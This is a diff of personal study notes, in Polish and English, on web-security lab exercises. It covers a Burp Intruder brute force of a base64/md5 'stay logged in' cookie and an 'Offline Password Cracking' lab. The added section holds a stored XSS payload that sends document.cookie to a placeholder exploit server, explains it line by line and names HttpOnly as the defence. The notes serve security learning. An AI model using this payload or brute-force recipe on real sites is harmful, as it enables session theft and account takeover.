@@ -187,7 +187,37 @@ Load the 302 response in the browser.
 1. loguje sie na wiener:peter checkbox on: stay logged in
 2. repeater > /my-account?id=wiener staylogged cookie jest w base64 (md5 ma ten sam hash co kodowanie base64?)
 3. log out.
-4. intruder GET /my-account?id=carlos > paste password list r > add rules > A.hash md5 > B. add prefix carlosr: > C.base64 encode > D. Grep Match "update email" (wiemy bo pierwszy BF poszedł na peter wiener)
+4. intruder GET /my-account?id=carlos > paste password list r > add rules > A.hash md5 > B. add prefix carlosr: > C.base64 encode > D. Grep Match "update email" (wiemy bo pierwszy BF poszedł na peter wiener
+5. request in browser in ORIGINAL SESSION
 
 <img width="1043" height="341" alt="image" src="https://github.com/user-attachments/assets/d4d2a3b9-bc2c-4adf-a731-ac707f36a3b7" />
+<img width="1468" height="657" alt="image" src="https://github.com/user-attachments/assets/0df7b30f-df48-46a1-95f9-6f158f7764a9" />
+
+
+mi sie udalo bez grep match bo znalazlam 200
+
+<img width="1195" height="252" alt="image" src="https://github.com/user-attachments/assets/9de732f0-0b48-48d3-a9c0-5e6a3827861f" />
+
+
+<br><br>
+<hr>
+<br><br>
+<h2>Lab: Offline Password Cracking</h2>
+
+1. w sekcji komentarzy wklejamy skrypt ze swoim expoit serverem
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+payload explanation:
+attacker control domain + <script>  tag HTML, który mówi przeglądarce: „Uruchom kod JavaScript”. + js will be executed in any visitor browser > document to obiekt w JavaScript, który reprezentuje aktualnie otwartą stronę HTML i ma dostęp do: cookies, formularze, elementy strony, URL > document.location oznacza adres URL aktualnej strony i można go zmieniać: document.location = "https://example.com" czyli działa jak redirect > 
+
+short
+JavaScript pobiera cookies użytkownika (document.cookie) i przekierowuje przeglądarkę (document.location) na serwer atakującego, przekazując te cookies w adresie URL.
+
+ochrona
+HttpOnly
+Wtedy: document.cookie nie zwróci cookie sesji
+
+2. exploit server: obserwujemy access log
+
+
+<img width="736" height="566" alt="image" src="https://github.com/user-attachments/assets/224da8b7-0887-4b66-a9e0-71f0d97bf8ec" />
 
